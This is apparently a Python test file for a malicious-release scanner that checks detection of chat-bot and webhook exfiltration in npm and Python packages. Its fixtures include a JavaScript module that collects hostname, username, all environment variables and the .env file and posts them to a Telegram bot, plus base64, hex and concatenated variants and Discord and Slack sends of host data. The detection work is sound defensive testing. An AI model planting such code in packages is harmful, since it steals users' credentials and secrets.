"""Chat bot and webhook endpoints a release starts posting to.

Every token, chat id and URL here is made up and built in the test; rules read it as text only.
"""

from __future__ import annotations

import base64

from hunter.head import load_head
from hunter.classify import _apply_score_floors
from hunter.bands import REVIEW_THRESHOLD
from hunter.features import extract_features
from hunter.models import ReleaseMeta
from hunter.rules import scan_release
from hunter.triage import diff_trees

TOKEN = "123456:FAKE-TOKEN"
TG = "https://api.telegram." + "org/bot"
DISCORD = "https://discord." + "com/api/webhooks/"
SLACK = "https://hooks.slack." + "com/services/"

CLEAN_BROWSER = "'use strict';\nexports.start = function start(page) {\n  return page.goto(url);\n};\n"
INFECTED_BROWSER = CLEAN_BROWSER + "require('../utils/report');\n"
# Shaped like the module a recent compromise added: reads env, host and project files, then posts them.
REPORT_MODULE = f"""'use strict';
const os = require('os');
const fs = require('fs');
const path = require('path');
const SINK = {{
    url: [
        '{TG}',
        '{TOKEN}',
        '/sendDocument',
    ].join(''),
    chat: 1234567,
}};
(function run() {{
    try {{
        const lines = ['host: ' + os.hostname(), 'user: ' + os.userInfo().username];
        for (const key of Object.keys(process.env)) lines.push(key + '=' + process.env[key]);
        try {{ lines.push(fs.readFileSync(path.join(process.cwd(), '.env'), 'utf8')); }} catch (e) {{}}
        const form = new FormData();
        form.append('chat_id', String(SINK.chat));
        form.append('document', new Blob([lines.join('\\n')]), 'r.txt');
        fetch(SINK.url, {{ method: 'POST', body: form }}).catch(() => null);
    }} catch (e) {{}}
}})();
"""


def _report(old: dict[str, str], new: dict[str, str], ecosystem: str | None = None):
    return scan_release(old, new, ecosystem=ecosystem)


def _rules(old: dict[str, str], new: dict[str, str]) -> set[str]:
    report = _report(old, new)
    return {hit.rule for hit in report.hits + report.info}


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def test_new_report_module_in_a_bundle_hits_strong_and_reaches_review():
    old = {"package.json": '{"name": "x"}', "dist/controllers/browser.js": CLEAN_BROWSER}
    new = {
        "package.json": '{"name": "x"}',
        "dist/controllers/browser.js": INFECTED_BROWSER,
        "dist/utils/report.js": REPORT_MODULE,
    }
    report = _report(old, new, ecosystem="npm")
    rules = {(hit.rule, hit.path) for hit in report.hits}
    assert ("net_chat_webhook_send", "dist/utils/report.js") in rules
    assert ("net_chat_webhook", "dist/utils/report.js") in rules
    assert report.verdict == "malicious"
    assert report.strong_floors == {"net_chat_webhook_send": "review"}
    assert all("FAKE-TOKEN" not in hit.matched for hit in report.hits)

    meta = ReleaseMeta("npm", "x", "1.0.1", "1.0.0", rank=1000)
    kept = diff_trees(old, new, force_keep=report.hits_by_path())
    code = extract_features(old, new, kept, meta, None)
    code.rule_report = report
    assert _apply_score_floors(code, 0.0, load_head("jev")) >= REVIEW_THRESHOLD


def test_joined_concat_base64_and_hex_forms_hit():
    url = f"{TG}{TOKEN}/sendMessage"
    forms = {
        "concat": f"const u = '{TG[:20]}' + '{TG[20:]}' + '{TOKEN}' + '/sendMessage';",
        "python join": f"u = ''.join(['{TG}', '{TOKEN}', '/sendMessage'])",
        "base64": f"const u = '{_b64(url)}';",
        "hex": f"const u = '{url.encode().hex()}';",
        "split base64": f"const u = atob('{_b64(url)[:24]}' + '{_b64(url)[24:]}');",
    }
    for name, line in forms.items():
        text = f"{line}\nfetch(Buffer.from(u, 'base64').toString(), {{method: 'POST', body: JSON.stringify(process.env)}});\n"
        assert "net_chat_webhook_send" in _rules({}, {"lib/r.js": text}), name


def test_discord_and_slack_webhooks_with_collection_hit():
    discord = f"fetch('{DISCORD}123456789012345678/FAKE-webhook-token', {{method: 'POST', body: os.hostname()}})"
    canary = f"fetch('https://canary.discord.com/api/webhooks/123456789/FAKE-webhook-token', {{body: os.userInfo()}})"
    slack = f"requests.post('{SLACK}T00000000/B00000000/FAKEFAKEFAKE', json=dict(os.environ))"
    assert "net_chat_webhook_send" in _rules({}, {"lib/d.js": discord + "\n"})
    assert "net_chat_webhook_send" in _rules({}, {"lib/c.js": canary + "\n"})
    assert "net_chat_webhook_send" in _rules({}, {"pkg/s.py": slack + "\n"})


def test_endpoint_without_a_written_token_or_without_collection_stays_weak():
    notifier = f"const url = `{TG}${{process.env.BOT_TOKEN}}/sendMessage`;\nfetch(url, {{method: 'POST', body: msg}});\n"
    rules = _rules({}, {"lib/notify.js": notifier})
    assert "net_chat_webhook" in rules
    assert "net_chat_webhook_send" not in rules
    no_reads = f"fetch('{DISCORD}123456789012345678/FAKE-webhook-token', {{method: 'POST', body: msg}})\n"
    rules = _rules({}, {"lib/d.js": no_reads})
    assert "net_chat_webhook" in rules
    assert "net_chat_webhook_send" not in rules


def test_sdk_whose_api_base_the_old_release_had_stays_quiet():
    old = {"lib/client.js": "const API = 'https://api.telegram.org';\nmodule.exports = API;\n"}
    new = {
        "lib/client.js": old["lib/client.js"],
        "lib/files.js": f"const os = require('os');\nconst u = '{TG}' + token + '/sendDocument';\n"
                        f"const t = '{TOKEN}';\nfs.readFileSync(p);\nos.hostname();\n",
    }
    assert not {"net_chat_webhook", "net_chat_webhook_send"} & _rules(old, new)


def test_webhook_sdk_new_release_with_unchanged_base_stays_quiet():
    base = f"const BASE = '{DISCORD}';\nfunction send(id, key, body) {{ return fetch(BASE + id + '/' + key, {{method: 'POST', body}}); }}\n"
    old = {"dist/index.js": base, "README.md": "Webhooks for chat.\n"}
    new = {"dist/index.js": base + "function sendFile(id, key, p) { return send(id, key, fs.readFileSync(p)); }\n",
           "README.md": "Webhooks for chat.\n"}
    assert not {"net_chat_webhook", "net_chat_webhook_send"} & _rules(old, new)


def test_endpoint_only_in_docs_or_comments_stays_quiet():
    new = {
        "README.md": f"Post to `{TG}<token>/sendMessage` or `{SLACK}T0/B0/x`.\n",
        "lib/index.js": f"// see {TG}{TOKEN}/sendMessage\nconst v = process.env.HOME;\n",
        "pkg/mod.py": f"# {DISCORD}123456789/FAKE-webhook-token\nimport os\nos.environ.get('X')\n",
    }
    assert not {"net_chat_webhook", "net_chat_webhook_send"} & _rules({}, new)


def test_unrelated_code_and_other_chat_links_stay_quiet():
    new = {
        "lib/a.js": "const name = 'Hello, ' + 'world';\nfetch('https://api.example.invalid/send', {body: os.hostname()});\n",
        "lib/b.js": "const invite = 'https://discord.com/invite/abc' + 'def';\nconst t = 'https://t.me/' + 'channel';\n",
        "dist/c.js": "const v = ['a', 'b', 'c'].join('');\nconst e = process.env.NODE_ENV;\n",
    }
    assert not {"net_chat_webhook", "net_chat_webhook_send"} & _rules({}, new)
